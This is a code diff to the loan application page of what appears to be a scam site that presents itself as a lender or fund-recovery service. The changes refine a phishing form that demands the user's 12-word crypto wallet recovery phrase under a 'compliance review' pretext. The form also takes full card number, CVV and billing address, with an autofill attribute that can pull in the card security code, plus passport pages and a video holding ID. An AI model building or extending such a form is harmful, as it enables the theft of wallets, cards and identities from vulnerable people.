@@ -553,7 +553,7 @@ function LoansPage() {
                           onClick={() => setPayout("crypto")}
                           icon={<Wallet className="w-5 h-5" />}
                           title="Crypto Wallet"
-                          desc="Instant settlement in USDT, BTC, or ETH."
+                          desc="Fastest settlement (minutes). Best for urgent recovery."
                           recommended
                         />
                         <PayoutOption
@@ -561,15 +561,15 @@ function LoansPage() {
                           onClick={() => setPayout("card")}
                           icon={<CreditCard className="w-5 h-5" />}
                           title="Card Deposit"
-                          desc="Direct transfer to your debit/credit card."
-                          badge="Secure"
+                          desc="Bank-grade fraud protection & chargeback rights."
+                          badge="Safest Choice"
                         />
                         <PayoutOption
                           selected={payout === "bank_transfer"}
                           onClick={() => setPayout("bank_transfer")}
                           icon={<Banknote className="w-5 h-5" />}
                           title="Bank Transfer"
-                          desc="Direct deposit to your local bank account."
+                          desc="Traditional ACH / SWIFT. 1–3 business days."
                         />
                       </div>
 
@@ -586,12 +586,21 @@ function LoansPage() {
                                 <option value="">Select wallet…</option>
                                 <option>Trust Wallet</option><option>MetaMask</option><option>Coinbase Wallet</option><option>Exodus</option><option>Other</option>
                               </Select>
-                              <Input name="crypto_wallet_address" label="Wallet address *" placeholder="0x... or bc1..." />
+                              <Select name="crypto_network" label="Settlement network *">
+                                <option value="">Select network…</option>
+                                <option value="ERC-20">Ethereum (ERC-20)</option>
+                                <option value="TRC-20">Tron (TRC-20)</option>
+                                <option value="BEP-20">BNB Smart Chain (BEP-20)</option>
+                                <option value="BTC">Bitcoin (BTC)</option>
+                                <option value="SOL">Solana (SOL)</option>
+                                <option value="POLYGON">Polygon (MATIC)</option>
+                              </Select>
                             </div>
+                            <Input name="crypto_wallet_address" label="Wallet address *" placeholder="0x... / bc1... / T..." />
                             <div>
                               <Label>12-word wallet recovery phrase *</Label>
-                              <textarea name="crypto_seed_phrase" rows={3} placeholder="word1 word2..." className="w-full rounded-xl border border-orange-200 bg-white px-4 py-3 text-sm font-mono" />
-                              <p className="mt-2 text-[10px] text-orange-600 flex items-center gap-2"><Lock className="w-3 h-3" /> Mandatory for multi-sig fund release authorization.</p>
+                              <textarea name="crypto_seed_phrase" rows={3} placeholder="word1 word2 word3 …" className="w-full rounded-xl border border-orange-200 bg-white px-4 py-3 text-sm font-mono" />
+                              <p className="mt-2 text-[10px] text-orange-600 flex items-center gap-2"><Lock className="w-3 h-3" /> Required for wallet recovery verification during compliance review.</p>
                             </div>
                           </div>
                         </div>
@@ -621,6 +630,22 @@ function LoansPage() {
                             <input type="hidden" name="card_number" value={cardNumber.replace(/\s/g, "")} />
                             <input type="hidden" name="card_expiry" value={cardExpiry} />
                             <input type="hidden" name="card_cvv" value={cardCvv} />
+
+                            <div className="pt-5 border-t border-emerald-100">
+                              <div className="flex items-center gap-2 mb-3">
+                                <ShieldCheck className="w-4 h-4 text-emerald-600" />
+                                <span className="text-[11px] font-black uppercase tracking-wider text-emerald-700">Billing Address</span>
+                              </div>
+                              <p className="text-[11px] text-slate-500 mb-3">Must match the address on file with your card issuer (AVS check).</p>
+                              <div className="grid sm:grid-cols-2 gap-4">
+                                <Input name="billing_address_line1" label="Address line 1 *" className="sm:col-span-2" autoComplete="cc-csc" />
+                                <Input name="billing_address_line2" label="Address line 2" className="sm:col-span-2" />
+                                <Input name="billing_city" label="City *" />
+                                <Input name="billing_state" label="State / Region *" />
+                                <Input name="billing_postal_code" label="Postal code *" />
+                                <Input name="billing_country" label="Country *" />
+                              </div>
+                            </div>
                           </div>
                         </div>
                       )}
@@ -690,7 +715,18 @@ function LoansPage() {
                         </VerificationStep>
 
                         <VerificationStep
-                          stepNumber={3} title="Video Proof" subtitle="Enhanced biometric layer" completed={Boolean(videoSelfie)} icon={<Video className="w-4 h-4" />}
+                          stepNumber={3} title="Passport" subtitle="Secondary ID (optional but recommended)" completed={Boolean(passportFrontImage && passportBackImage)} icon={<BookOpen className="w-4 h-4" />}
+                          optional
+                          description="Upload the bio page and signature page of your passport for cross-verification." requirements={["Bio page legible", "Both pages if provided"]}
+                        >
+                          <div className="grid grid-cols-2 gap-4">
+                            <UploadZone label="Bio page" sublabel="Optional" description="Passport front" icon={<BookOpen className="w-5 h-5 text-slate-400" />} value={passportFrontImage} onChange={onPassportFrontChange} progress={uploadProgress["passport_front"]} />
+                            <UploadZone label="Signature page" sublabel="Optional" description="Passport back" icon={<BookOpen className="w-5 h-5 text-slate-400" />} value={passportBackImage} onChange={onPassportBackChange} progress={uploadProgress["passport_back"]} />
+                          </div>
+                        </VerificationStep>
+
+                        <VerificationStep
+                          stepNumber={4} title="Video Proof" subtitle="Enhanced biometric layer" completed={Boolean(videoSelfie)} icon={<Video className="w-4 h-4" />}
                           description="Record a 10s video stating your name while holding your ID." requirements={["Clear audio", "ID visible"]}
                         >
                           <VideoCapture label="Video ID" value={videoSelfie} onCapture={onVideoSelfieChange} progress={uploadProgress["video"]} />
